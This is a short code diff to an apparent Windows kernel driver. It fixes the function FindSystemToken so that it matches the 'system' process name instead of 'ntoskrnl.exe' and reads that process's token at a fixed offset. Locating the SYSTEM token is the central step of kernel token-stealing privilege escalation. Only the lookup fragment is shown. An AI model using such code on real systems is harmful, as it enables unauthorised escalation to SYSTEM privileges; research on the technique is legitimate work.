@@ -98,7 +98,7 @@ PVOID FindSystemToken() {
 		RtlCopyMemory(procName, (PUCHAR)currentProcess + ImageFileNameOffset, sizeof(procName) - 1);
 		procName[sizeof(procName) - 1] = '\0';
 
-		if (_stricmp((const char*)procName, "ntoskrnl.exe") == 0) {
+		if (_stricmp((const char*)procName, "system") == 0) {
 			PVOID systemToken = *(PVOID*)((PUCHAR)currentProcess + TokenOffset);
 			DbgPrint("[%s]: Found ntoskrnl.exe process at %p, token at %p\n", DRIVER_NAME, currentProcess, systemToken);
 			return systemToken;
